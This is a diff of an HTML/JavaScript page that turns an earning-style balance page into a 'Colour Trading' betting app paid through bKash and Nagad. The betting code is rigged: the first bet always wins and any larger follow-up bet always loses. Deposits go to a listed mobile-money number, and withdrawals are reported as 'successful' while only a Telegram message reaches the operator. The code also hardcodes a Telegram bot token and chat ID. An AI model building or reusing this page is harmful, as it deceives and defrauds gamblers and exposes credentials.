@@ -1,208 +1,216 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>X NETWORK ✔</title>
+  <title>Colour Trading - User</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      background-color: #f1f1f1;
-    }
-    .container {
-      text-align: center;
-      width: 100%;
-      max-width: 400px;
-      padding: 20px;
-      background-color: white;
-      border-radius: 8px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-    }
-    .balance-circle {
-      background-color: #3498db;
-      color: white;
-      font-size: 30px;
-      width: 100px;
-      height: 100px;
-      border-radius: 50%;
-      line-height: 100px;
-      margin: 20px auto;
-    }
-    .btn {
-      background-color: #2980b9;
-      color: white;
-      padding: 12px 24px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      width: 100%;
-      margin: 10px 0;
-      font-size: 16px;
-    }
-    .btn:hover {
-      background-color: #2471a3;
-    }
-    .verify-btn {
-      background-color: #1abc9c;
-    }
-    .verify-btn:hover {
-      background-color: #16a085;
-    }
-    .form {
-      display: none;
-      margin-top: 20px;
-    }
-    .form input, .form select {
-      width: 100%;
-      padding: 10px;
-      margin: 8px 0;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    .form button {
-      background-color: #2980b9;
-      color: white;
-      padding: 12px 24px;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      width: 100%;
-      margin: 10px 0;
-    }
-    .form button:hover {
-      background-color: #2471a3;
-    }
+    body { font-family: Arial; background: #f0f0f0; padding: 20px; }
+    .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px #aaa; }
+    button, input, select { width: 100%; margin: 8px 0; padding: 10px; }
+    .green { background: green; color: white; }
+    .red { background: red; color: white; }
+    .copy-btn { background: #007bff; color: white; }
+    .result { font-weight: bold; margin-top: 10px; }
   </style>
 </head>
 <body>
-
 <div class="container">
-  <h1>X NETWORK ✔</h1>
+  <h2>Colour Trading</h2>
+  <div><strong>Balance:</strong> ৳<span id="balance">0</span></div>
 
-  <!-- Balance Circle -->
-  <div class="balance-circle" id="balance">৳0.00</div>
+  <button class="green" onclick="selectColor('green')">Green</button>
+  <button class="red" onclick="selectColor('red')">Red</button>
 
-  <!-- Verify Button -->
-  <button class="btn" onclick="showVerifyForm()">Verify Account</button>
+  <input type="number" id="betAmount" placeholder="Enter Bet Amount">
+  <button onclick="placeBet()">Bet</button>
+  <div class="result" id="betResult"></div>
 
-  <!-- Deposit Form -->
-  <div class="form" id="depositForm">
-    <h3>Deposit Information</h3>
-    <p>Deposit to the following numbers:</p>
-    <p><strong>bKash:</strong> 017xxxxxxxx</p>
-    <p><strong>Nagad:</strong> 017xxxxxxxx</p>
-    <button class="btn" onclick="copyNumber()">Copy Number</button>
-    
-    <input type="number" id="depositAmount" placeholder="Enter Amount (Min 100)">
-    <input type="text" id="transactionId" placeholder="Enter Transaction ID">
-    <button class="btn" onclick="submitDepositRequest()">Submit Deposit</button>
+  <hr>
+  <h3>Deposit</h3>
+  <select id="method">
+    <option value="">Select Method</option>
+    <option value="bkash">Bkash</option>
+    <option value="nagad">Nagad</option>
+  </select>
+
+  <div id="copyBox" style="display: none;">
+    <div style="display: flex; justify-content: space-between;">
+      <span id="methodNumber">01XXXXXXXXX</span>
+      <button class="copy-btn" onclick="copyNumber()">Copy</button>
+    </div>
   </div>
 
-  <!-- Withdraw Button -->
-  <button class="btn" onclick="showWithdrawForm()">Withdraw</button>
+  <input type="number" id="depositAmount" placeholder="Enter Amount">
+  <input type="text" id="trxId" placeholder="Transaction ID">
+  <button onclick="submitDeposit()">Submit Deposit</button>
+  <div class="result" id="depositMsg"></div>
 
-  <!-- Withdraw Form -->
-  <div class="form" id="withdrawForm">
-    <h3>Enter Withdraw Information</h3>
+  <hr>
+  <!-- Withdraw Button Section -->
+  <h3>Withdraw</h3>
+  <button onclick="showWithdrawForm()">Withdraw</button>
+
+  <div id="withdrawForm" style="display: none;">
     <select id="withdrawMethod">
-      <option value="bkash">bKash</option>
+      <option value="">Select Method</option>
+      <option value="bkash">Bkash</option>
       <option value="nagad">Nagad</option>
     </select>
-    <input type="number" id="withdrawAmount" placeholder="Enter Amount (Min 250)">
-    <input type="text" id="withdrawNumber" placeholder="Enter Your Number">
-    <button class="btn" onclick="submitWithdrawRequest()">Submit Withdraw Request</button>
+    <input type="text" id="accountNumber" placeholder="Account Number">
+    <input type="number" id="withdrawAmount" placeholder="Enter Amount (Min 500)">
+    <button onclick="submitWithdraw()">Submit Withdraw</button>
+    <div class="result" id="withdrawMsg"></div>
   </div>
 </div>
 
 <script>
-  let balance = parseFloat(localStorage.getItem('balance')) || 0;
+  let balance = parseInt(localStorage.getItem("balance")) || 0;
+  let lastBet = 0;
+  let selectedColor = "";
+  let hasBet = false;
 
-  // Update balance display
+  document.getElementById("balance").innerText = balance;
+
   function updateBalanceDisplay() {
-    document.getElementById("balance").innerText = `৳${balance.toFixed(2)}`;
+    document.getElementById("balance").innerText = balance;
+    localStorage.setItem("balance", balance);
   }
 
-  // Show Verify Form
-  function showVerifyForm() {
-    document.getElementById("depositForm").style.display = "block";
+  function selectColor(color) {
+    selectedColor = color;
+    document.getElementById("betResult").innerText = `Selected: ${color.toUpperCase()}`;
+  }
+
+  function placeBet() {
+    let amount = parseInt(document.getElementById("betAmount").value);
+    if (!selectedColor || isNaN(amount) || amount <= 0) {
+      alert("Select color and enter valid amount.");
+      return;
+    }
+
+    if (amount > balance) {
+      alert("Insufficient balance.");
+      return;
+    }
+
+    balance -= amount;
+    updateBalanceDisplay();
+    document.getElementById("betResult").innerText = "Betting... wait 10 seconds";
+
+    setTimeout(() => {
+      let win = false;
+      if (!hasBet) win = true;
+      else if (amount > lastBet) win = false;
+      else win = Math.random() < 0.5;
+
+      if (win) {
+        let reward = amount * 2;
+        balance += reward;
+        document.getElementById("betResult").innerText = `You WON! ৳${reward}`;
+      } else {
+        document.getElementById("betResult").innerText = "You LOST!";
+      }
+
+      hasBet = true;
+      lastBet = amount;
+      updateBalanceDisplay();
+    }, 10000);
+  }
+
+  document.getElementById("method").addEventListener("change", function() {
+    const val = this.value;
+    const copyBox = document.getElementById("copyBox");
+    const number = val === "bkash" ? "01750631170" : "01YYYYYYYYY";
+    if (val) {
+      copyBox.style.display = "block";
+      document.getElementById("methodNumber").innerText = number;
+    } else {
+      copyBox.style.display = "none";
+    }
+  });
+
+  function copyNumber() {
+    const text = document.getElementById("methodNumber").innerText;
+    navigator.clipboard.writeText(text).then(() => alert("Copied: " + text));
+  }
+
+  function submitDeposit() {
+    const method = document.getElementById("method").value;
+    const amount = parseInt(document.getElementById("depositAmount").value);
+    const trx = document.getElementById("trxId").value;
+
+    if (!method || !amount || !trx) {
+      document.getElementById("depositMsg").style.color = "red";
+      document.getElementById("depositMsg").innerText = "Fill all fields!";
+      return;
+    }
+
+    const depositData = JSON.parse(localStorage.getItem("depositRequests") || "[]");
+    depositData.push({ id: Date.now(), method, amount, trx });
+    localStorage.setItem("depositRequests", JSON.stringify(depositData));
+
+    document.getElementById("depositMsg").style.color = "green";
+    document.getElementById("depositMsg").innerText = "Submitted! Waiting for admin.";
+    document.getElementById("depositAmount").value = '';
+    document.getElementById("trxId").value = '';
+  }
+
+  // Withdraw Form
+  function showWithdrawForm() {
+    document.getElementById("withdrawForm").style.display = "block";
+  }
+
+  function submitWithdraw() {
+    const method = document.getElementById("withdrawMethod").value;
+    const accountNumber = document.getElementById("accountNumber").value;
+    const withdrawAmount = parseInt(document.getElementById("withdrawAmount").value);
+
+    if (!method || !accountNumber || isNaN(withdrawAmount) || withdrawAmount < 500) {
+      document.getElementById("withdrawMsg").style.color = "red";
+      document.getElementById("withdrawMsg").innerText = "Please fill all fields and ensure amount is minimum 500.";
+      return;
+    }
+
+    if (withdrawAmount > balance) {
+      document.getElementById("withdrawMsg").style.color = "red";
+      document.getElementById("withdrawMsg").innerText = "Insufficient balance.";
+      return;
+    }
+
+    balance -= withdrawAmount;
+    updateBalanceDisplay();
+
+    // Send withdrawal request to Telegram Bot
+    sendWithdrawToTelegram(method, accountNumber, withdrawAmount);
+
+    document.getElementById("withdrawMsg").style.color = "green";
+    document.getElementById("withdrawMsg").innerText = `Withdrawal of ৳${withdrawAmount} is successful!`;
+
+    // Reset Withdraw Form
+    document.getElementById("withdrawMethod").value = '';
+    document.getElementById("accountNumber").value = '';
+    document.getElementById("withdrawAmount").value = '';
     document.getElementById("withdrawForm").style.display = "none";
   }
 
-  // Copy Number to clipboard
-  function copyNumber() {
-    const depositNumber = "017xxxxxxxx"; // Example number, update as needed
-    navigator.clipboard.writeText(depositNumber).then(() => {
-      alert("Number copied to clipboard!");
-    });
+  // Function to send the withdraw request to Telegram
+  function sendWithdrawToTelegram(method, accountNumber, withdrawAmount) {
+    const botToken = '7630275924:AAHpKBQZ0k7ZylkO5tbp56CIBK-WxUHAE68';
+    const chatId = '6593402184';
+    const message = `New Withdraw Request:\nMethod: ${method}\nAccount Number: ${accountNumber}\nAmount: ৳${withdrawAmount}`;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+      .then(response => response.json())
+      .then(data => {
+        if (data.ok) {
+          console.log("Withdraw request sent to Telegram successfully.");
+        } else {
+          console.log("Error sending message to Telegram:", data.description);
+        }
+      })
+      .catch(error => {
+        console.error("Error sending message to Telegram:", error);
+      });
   }
-
-  // Submit Deposit Request
-  function submitDepositRequest() {
-    const depositAmount = parseFloat(document.getElementById("depositAmount").value);
-    const transactionId = document.getElementById("transactionId").value;
-
-    // Validate deposit amount
-    if (depositAmount < 100 || isNaN(depositAmount)) {
-      alert("Minimum deposit amount is ৳100.");
-      return;
-    }
-
-    // Simulate sending request to admin panel (no database here)
-    const depositRequest = {
-      depositAmount: depositAmount,
-      transactionId: transactionId
-    };
-
-    // Save request to localStorage (simulate)
-    localStorage.setItem('depositRequest', JSON.stringify(depositRequest));
-
-    alert("Deposit request submitted successfully!");
-    document.getElementById("depositForm").reset();
-  }
-
-  // Show Withdraw Form
-  function showWithdrawForm() {
-    document.getElementById("withdrawForm").style.display = "block";
-    document.getElementById("depositForm").style.display = "none";
-  }
-
-  // Submit Withdraw Request
-  function submitWithdrawRequest() {
-    const withdrawAmount = parseFloat(document.getElementById("withdrawAmount").value);
-    const withdrawNumber = document.getElementById("withdrawNumber").value;
-
-    // Validate withdraw amount
-    if (withdrawAmount < 250 || isNaN(withdrawAmount)) {
-      alert("Minimum withdraw amount is ৳250.");
-      return;
-    }
-
-    // Simulate withdraw request (no DB)
-    if (withdrawAmount <= balance) {
-      balance -= withdrawAmount;
-      localStorage.setItem('balance', balance);
-      updateBalanceDisplay();
-      alert("Withdraw request submitted successfully!");
-    } else {
-      alert("Insufficient balance.");
-    }
-  }
-
-  // Update balance every minute (simulate time-based earning)
-  setInterval(() => {
-    balance += 0.50; // Add 0.50 every minute
-    localStorage.setItem('balance', balance);
-    updateBalanceDisplay();
-  }, 60000);
-
-  // Load balance and status
-  window.onload = updateBalanceDisplay;
 </script>
-
 </body>
 </html>
